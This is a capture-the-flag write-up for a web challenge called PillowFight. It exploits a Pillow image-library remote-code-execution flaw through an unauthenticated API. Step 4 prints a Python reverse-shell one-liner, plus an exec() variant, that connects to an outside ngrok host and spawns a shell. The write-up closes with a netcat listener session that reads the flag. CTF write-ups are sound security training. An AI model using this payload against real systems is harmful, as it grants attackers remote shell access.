Name: PillowFight
Value: 338 points
Category: Web 
Solves: 182 Solves 
Author: @HuskyHacks

Description:
PillowFight uses advanced AI/MLRegressionLearning* to combine two images of your choosing

*note to investors this is not techically true at the moment we're using a python library but please give us money and we'll deliver it we promise.

Press the Start button on the top-right to begin this challenge.

Connect with:
http://challenge.ctf.games:31210

Please allow up to 30 seconds for the challenge to become available.

Solution:

1. Connect to the challenge interface and start performing recon

2. The first thing I did was check out the API documentation as suggested on the landing page.
   Since the API was accepting unauthenticated requests we could go right to town fuzzing.

3. Given the challenge name, and doing some research we cound that there was a RCE CVE issued for the Pillows library.

	a. https://duartecsantos.github.io/2024-01-02-CVE-2023-50447/

4. Staging our payload with two test images (1.jpg & 2.jpg) we can execute a Python shell courtesy of RevShells

	a. IP: 6.tcp.ngrok.io:17898 -> localhost:4444
	b. python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("6.tcp.ngrok.io",17898));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
	c. Since Python is already executing we can just send the quoted bits.
	d. exec('import os,pty,socket;s=socket.socket();s.connect(("6.tcp.ngrok.io",17898));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")')

5. We land in our Reverse Shell and are able to capture the flag

┌──(kali㉿kali2024)-[~]
└─$ nc -lvp 4444                
listening on [any] 4444 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 32792
# ls       
ls
Dockerfile  app.py  bliss.png  challenge.yml  flag.txt  solve.py
# cat flag.txt
cat flag.txt
flag{b6b62e6c5cdfda3b3a8b87d90fd48d01}